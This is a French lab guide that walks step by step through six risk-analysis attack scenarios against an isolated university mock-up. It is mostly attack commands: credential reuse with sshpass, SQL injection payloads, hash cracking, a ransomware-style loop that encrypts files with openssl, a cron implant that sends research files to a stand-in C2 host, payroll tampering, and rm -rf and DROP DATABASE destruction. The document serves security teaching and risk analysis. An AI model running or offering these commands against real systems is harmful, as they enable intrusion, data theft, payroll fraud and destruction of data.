# Scénarios opérationnels — démonstrations pas-à-pas

Procédures techniques permettant de **rejouer concrètement** les 6 scénarios
opérationnels (SO1–SO6) retenus dans l'analyse de risque
(`analyse-risque/EBIOS_RM_UniCampus.xlsx`, feuille A4.1) contre la maquette
déployée par Terraform.

> ⚠️ Ces démonstrations sont à exécuter **uniquement** sur la maquette
> isolée du groupe. Aucune des commandes ci-dessous ne doit être exécutée
> contre un système réel.

Références croisées :
- Architecture complète : [architecture-technique.md](architecture-technique.md)
- Mapping codes EBIOS → maquette : [mapping-analyse-risque.md](mapping-analyse-risque.md)

---

## 0. Pré-requis communs

### 0.1 Connaître les IPs

```bash
# Depuis l'environnement de l'attaquant (machine externe) :
export FW=<floating-ip-fw-legacy>       # ex. 137.194.x.x
export VPN=<floating-ip-vpn-legacy>
export MAIL=<floating-ip-srv-mail>
export MOODLE=<floating-ip-srv-moodle>
export WEBRH=<floating-ip-web-rh>       # nouveau, cf. floating_ips.tf

# IPs internes (constantes) :
export I_FW=192.168.107.2
export I_VPN=192.168.107.3
export I_MAIL=192.168.107.10
export I_LDAP=192.168.107.11
export I_MOODLE=192.168.107.12
export I_WEBRH=192.168.107.14
export I_CALC=192.168.107.15
export I_DBRH=192.168.107.20
```

### 0.2 Position initiale selon la source de risque

| SR | Position de départ | Comment se mettre en position |
|---|---|---|
| SR-A Étudiant | `uc-poste-etu` (interne, VLAN) | SSH depuis le rebond fw-legacy : `ssh ubuntu@$FW`, puis `ssh ubuntu@<ip-poste-etu>` |
| SR-B Cybercriminel | Internet (externe) | Exécuter depuis sa propre machine attaquante avec les floating IPs |
| SR-C Acteur étatique | Internet + creds applicatifs PA1 | Idem SR-B + creds `pa1/partenaire2024` |
| SR-E Personnel mécontent | Interne ou externe avec creds légitimes | SSH avec un compte nominatif depuis n'importe où (cf. VPN) |

---

## SO1 — Étudiant malveillant compromet les résultats académiques

**Source de risque** : SR-A Étudiant malveillant
**Évènement redouté** : ER03 Altération frauduleuse des notes
**Position** : connecté en WiFi étudiant ⇒ shell sur `uc-poste-etu`

### Étape C — Reconnaissance

```bash
# Scan du VLAN pour cartographier le SI
nmap -sn 192.168.107.0/24
# Identification des services principaux :
nmap -sV -p 22,80,389,3306,2049,8888 192.168.107.10-20

# Énumération LDAP anonyme : récupération de tous les comptes
ldapsearch -x -h $I_LDAP -b "dc=unicampus,dc=local" "(objectClass=inetOrgPerson)" uid cn mail
# Résultat : on apprend que jdupont (Jean-Pierre Dupont, enseignant) existe
```

### Étape R — Phishing de jdupont

*Modélisation* : on simule le phishing en utilisant directement les
identifiants connus de la maquette (`jdupont/unicampus2024`). Dans une vraie
démo, ce serait un envoi de mail piégé depuis `uc-srv-mail` (relais ouvert,
pas de SPF/DKIM/DMARC).

```bash
# Test des creds récupérés contre IMAP (clair)
curl --silent -u jdupont:unicampus2024 imap://$I_MAIL/INBOX/
# OK -> creds valides
```

### Étape T — Connexion Moodle avec les credentials enseignant

```bash
# Connexion sur la mire Moodle via les creds enseignant
curl -c cookies.txt -L "http://$I_MOODLE/login/index.php" \
  -d "username=jdupont&password=unicampus2024"
# Le compte jdupont est un user Moodle légitime (avec ses droits enseignant)
```

### Étape E — Modification des notes

Deux options :

**Option A — via l'UI Moodle** (la plus fidèle au chemin retenu A4.1) :
Naviguer dans Cours → Carnet de notes → modifier la note d'un étudiant.
Aucun log centralisé, aucun audit applicatif → aucune détection.

**Option B — pivot sur le compte admin Moodle** :
```bash
# Login admin Moodle (creds en clair dans le script de provision)
curl -c cookies.txt "http://$I_MOODLE/login/index.php" \
  -d "username=admin&password=Admin2024"
# -> accès complet à toutes les notes de tous les étudiants
```

**Vérification ER03** : la note modifiée persiste dans `mdl_grade_grades`
sans trace dans aucun log centralisé.

---

## SO2 — Cybercriminel déploie un rançongiciel

**Source de risque** : SR-B Cybercriminel organisé
**Évènement redouté** : ER06 (interruption massive) + ER04 (services pédago)
**Position** : externe, sur Internet

### Étape C — OSINT

```bash
# Identification du personnel (LinkedIn, site UniCampus, leaks HIBP)
# -> on cible Jean-Pierre Dupont (jdupont@unicampus.local)
```

### Étape R — Phishing → cred de jdupont

*Modélisation* : le mail piégé extrait le mot de passe `unicampus2024`
(via fausse mire Moodle, keylogger, ou capture HTTP du portail).

### Étape T — Latéralisation par cred reuse

C'est ici que le **principe "pas de SSO → réutilisation des mots de passe"**
prend toute sa valeur. Le mot de passe de jdupont marche sur **plusieurs**
services :

```bash
# 1. SSH depuis Internet vers srv-mail (floating IP, SSH password activé)
ssh jdupont@$MAIL          # mot de passe : unicampus2024 -> OK

# 2. Sur srv-mail, lecture de la boite mail de jdupont
cat /home/jdupont/Maildir/cur/*
# -> on trouve l'email DSI :
#    "Compte d'urgence acces serveurs : dsi / admin2024"
#    "Ce compte dispose de sudo sans mot de passe sur toutes les VMs."

# Bonus : on récupère aussi le PDF email VPN
ls /home/jdupont/*.pdf
# email_dsi_acces_vpn_CONFIDENTIEL.pdf -> creds VPN : campus/unicampus2024
```

### Étape T (suite) — Élévation via le compte `dsi`

```bash
# Depuis srv-mail, on teste le compte dsi sur les autres serveurs
for SRV in moodle ldap calc-recherche web-rh db-rh; do
  sshpass -p admin2024 ssh -o StrictHostKeyChecking=no \
    dsi@uc-srv-$SRV "hostname && sudo -n id"
done
# -> on a accès en root sur Moodle, LDAP, Recherche, Web RH, DB RH
```

### Étape E — Déploiement simultané du rançongiciel

```bash
# Pour chaque serveur (simulation : on chiffre /var/www, /srv, /home)
RANSOM_NOTE="UNICAMPUS LOCKED - Send 10 BTC to bc1q... within 72h"
for SRV in srv-moodle srv-mail srv-ldap web-rh db-rh calc-recherche; do
  sshpass -p admin2024 ssh dsi@uc-$SRV "sudo bash -c '
    find /var/www /srv /home -type f \\( -name \"*.pdf\" -o -name \"*.php\" -o -name \"*.sql\" \\) \
      -exec openssl enc -aes-256-cbc -salt -in {} -out {}.locked -pass pass:p4wn3d \\; \
      -exec rm {} \\;
    echo \"$RANSOM_NOTE\" > /UNICAMPUS-README.txt
  '"
done
# ER06 + ER04 réalisés : tous les services applicatifs indisponibles
```

**Note pédagogique** : pas besoin de rançongiciel réel ; un `find … -delete`
ou un `dd if=/dev/zero of=/var/www/html/moodle/config.php` suffit pour
démontrer l'impact. Penser à faire un snapshot OpenStack **avant** la démo.

---

## SO3 — Cybercriminel exfiltre les données personnelles RH

**Source de risque** : SR-B Cybercriminel organisé
**Évènement redouté** : ER01 Fuite données personnelles
**Position** : externe, sur Internet

### Étape C — Port scan externe

```bash
# Scan des floating IPs du périmètre exposé
nmap -sV -p 22,25,80,143,443,1723,3306 $FW $VPN $MAIL $MOODLE $WEBRH
# -> $WEBRH expose Apache/PHP (vulnérabilité d'exposition d'une appli RH interne)
```

### Étape R — Injection SQL sur uc-web-rh

```bash
# Test classique de présence d'injection
curl "http://$WEBRH/?login=admin'"
# -> erreur SQL "You have an error in your SQL syntax" -> SQLi confirmée

# Login bypass / dump via UNION
curl "http://$WEBRH/?login=' UNION SELECT login,nom,poste,password_sha1 FROM employes-- -"
# -> dump des comptes RH avec hash SHA1
```

### Étape T — Lecture directe uc-db-rh (le port est exposé !)

```bash
# Connexion directe via les creds trouvés par SQLi (root/root accessible à distance)
mysql -h <ip-publique-db-rh-via-pivot> -u root -proot rh -e "SELECT * FROM employes;"

# Ou via pivot SSH (web-rh a sudo + accès interne)
# 1. SQLi exécution de commande via INTO OUTFILE (si webshell pas dispo, on dump direct)
# 2. Cracker les hashs SHA1 (sans sel)
echo "<sha1_hash>" > hashes.txt
hashcat -m 100 -a 0 hashes.txt rockyou.txt
# -> SHA1 sans sel = cracké en <1s pour des mdp faibles type unicampus2024
```

### Étape E — Exfiltration

```bash
# Dump complet de la base RH
mysqldump -h <ip-via-pivot> -u root -proot rh > rh-leak.sql
# 500 personnels, données RGPD (nom, salaire, RIB)

# Bonus : énumération LDAP anonyme pour les comptes étudiants/enseignants
ldapsearch -x -h $I_LDAP -b "dc=unicampus,dc=local" "(objectClass=inetOrgPerson)" \
  uid cn mail userPassword > ldap-leak.ldif
```

**Vérification ER01** : ~500 employés + tous les utilisateurs LDAP exfiltrés.
Pas de DLP, pas de logs centralisés → 0 détection.

---

## SO4 — Acteur étatique exfiltre le patrimoine scientifique

**Source de risque** : SR-C Acteur étatique / concurrent (APT)
**Évènement redouté** : ER02 Fuite données de recherche
**Position** : externe + **credentials applicatifs PA1 compromis**

### Étape C — Identification du partenaire et de ses accès

*Modélisation* : l'APT a compromis (ailleurs, hors maquette) les credentials
d'un compte applicatif du laboratoire partenaire PA1 utilisés pour la
collaboration scientifique. Ces creds sont `pa1/partenaire2024` et ouvrent
le partage Samba `[partenaires]` sur `uc-calc-recherche`.

### Étape R — Connexion via les creds partenaire

Deux canaux disponibles avec le même compte :

**Canal A — Samba authentifié** (le plus discret) :
```bash
# Depuis une machine atteignant uc-calc-recherche (via VPN, ou depuis le VLAN)
smbclient //$I_CALC/partenaires -U pa1%partenaire2024
# smb> dir
# smb> mget *.pdf
```

**Canal B — SSH** (plus puissant, plus bruyant) :
```bash
ssh pa1@$I_CALC                  # mot de passe : partenaire2024
# Accès complet à /srv/recherche, plus possibilité d'enquêter sur le système
```

### Étape T — Accès aux données

```bash
# Inventaire des données scientifiques
ls -la /srv/recherche/
#   article_optimisation_IA_distribuee.pdf
#   notebook_feddiff_training_recherche_CONFIDENTIEL.pdf
#   rapport_experience_labo_capteurs_2024.pdf
#   rapport_intermediaire_ANR_SecureFL_2024.pdf

# Le notebook Jupyter expose aussi les datasets
curl http://$I_CALC:8888/api/contents
# -> aucune authentification, lecture des notebooks et données associées
```

### Étape E — Exfiltration low and slow + persistance

```bash
# Exfiltration progressive (un fichier par jour pour rester sous les radars)
scp pa1@$I_CALC:/srv/recherche/notebook_feddiff_training_recherche_CONFIDENTIEL.pdf .

# Persistance : implant léger en cron utilisateur (pa1)
ssh pa1@$I_CALC "echo '0 3 * * * tar czf - /srv/recherche | curl -X POST --data-binary @- https://c2.example.com/exfil' >> ~/.crontab"
```

**Vérification ER02** : le patrimoine scientifique fuite sans détection
(aucun DLP, NFS sans audit, Jupyter sans auth).

---

## SO5 — Personnel mécontent détourne la paie

**Source de risque** : SR-E Personnel mécontent ou ex-personnel
**Évènement redouté** : ER05 Altération frauduleuse de la paie
**Position** : compte légitime (ex. `cfournier` VP Finances, ou tout
personnel avec un compte valide)

### Étape R — Connexion légitime

```bash
# L'insider utilise simplement son compte légitime
ssh cfournier@$I_WEBRH                # mot de passe : finance2024
# (ou via VPN PPTP campus/unicampus2024 depuis l'extérieur)
```

### Étape T+E — Modification RIB / salaire

Trois chemins possibles, tous démontrables :

**Chemin A — Formulaire web-rh** (le plus simple, c'est la démo de référence) :
```bash
# Sur n'importe quelle machine ayant accès à uc-web-rh (VLAN ou via floating)
curl -X POST "http://$I_WEBRH/" \
  -d "action=update&login=cfournier&salaire=15000&rib=FR7600000000000000ATTAQUE001"
# -> aucune authentification requise, aucun audit, aucun double contrôle
# -> la VP Finances se vire 15000€ et change son RIB pour le compte de l'attaquant
```

**Chemin B — UPDATE direct sur uc-db-rh** (creds `rhapp` connus depuis web-rh.sh) :
```bash
mysql -h $I_DBRH -u rhapp -prh2024 rh -e \
  "UPDATE employes SET rib='FR76ATTAQUE...' WHERE login='cfournier'"
```

**Chemin C — UPDATE en tant que root MariaDB** (plus brutal) :
```bash
mysql -h $I_DBRH -u root -proot rh -e \
  "UPDATE employes SET salaire=salaire*2 WHERE poste LIKE 'VP%'"
```

**Vérification ER05** :
```bash
curl "http://$I_WEBRH/?login=cfournier"
# Claire Fournier — VP Finances — 15000 EUR — RIB: FR76ATTAQUE...
```

Aucune trace dans un log applicatif. Le seul moyen de détecter serait un
contrôle externe (rapprochement comptable mensuel) — non modélisé.

---

## SO6 — Personnel mécontent détruit par vengeance

**Source de risque** : SR-E Personnel mécontent ou ex-personnel
**Évènement redouté** : ER05 + ER09 Perte définitive de la recherche
**Position** : compte légitime nominatif (ex. `jdupont`)

### Étape R — Connexion légitime

```bash
# L'insider utilise son compte. Plusieurs surfaces :
ssh jdupont@$I_MAIL          # accès mail
ssh jdupont@$I_MOODLE        # accès Moodle
ssh jdupont@$I_CALC          # accès recherche
```

### Étape T — Identification des cibles

```bash
# Sur uc-calc-recherche, le compte jdupont a accès à /srv/recherche
# (groupe sleblanc/recherche, et NFS export *) :
ls -la /srv/recherche/
# Tous les PDF leurres sont accessibles en lecture
```

### Étape E — Destruction

**Variante A — Suppression directe (pas besoin de root, NFS est ouvert)** :
```bash
# Depuis n'importe quelle machine du VLAN ayant nfs-common
mount -t nfs $I_CALC:/srv/recherche /mnt
rm -rf /mnt/*
# ER09 : patrimoine scientifique détruit (et aucune sauvegarde immuable)
```

**Variante B — Chiffrement vengeur** :
```bash
# Idem que SO2 sur un périmètre réduit (juste recherche)
for f in /mnt/*.pdf; do
  openssl enc -aes-256-cbc -in "$f" -out "$f.locked" -pass pass:revanche
  rm "$f"
done
```

**Variante C — Pivot via le compte `dsi` retrouvé sur srv-mail** :
Si l'insider a déjà compromis srv-mail (cf. SO2), il peut élever ses
privilèges et détruire aussi les bases RH :
```bash
ssh dsi@$I_DBRH
sudo mysql -e "DROP DATABASE rh;"   # ER05 + ER09
```

**Vérification ER05/ER09** : données disparues, pas de sauvegarde,
restauration impossible.

---

## Annexe — Vérifications post-démo

| SO | Indicateur de réussite |
|---|---|
| SO1 | Note modifiée dans la base Moodle persiste après refresh |
| SO2 | Tous les services applicatifs HTTP/IMAP/etc. répondent par erreur ou page chiffrée |
| SO3 | Dump SQL de la base `rh` récupéré localement (taille ≥ qq Ko) |
| SO4 | Notebook ANR récupéré localement, persistance cron active sur le compte pa1 |
| SO5 | RIB modifié visible dans la recherche `web-rh` |
| SO6 | `ls /srv/recherche/` vide ou rempli de `.locked` |

## Annexe — Restauration de la maquette après démo

La maquette n'a **aucune sauvegarde** par conception. Pour revenir à un état
propre, utiliser les snapshots OpenStack (à prendre **avant** chaque démo)
ou redéployer entièrement :

```bash
cd terraform
terraform destroy -auto-approve
terraform apply -auto-approve
# (depuis la pipeline GitLab : relancer terraform_apply)
```
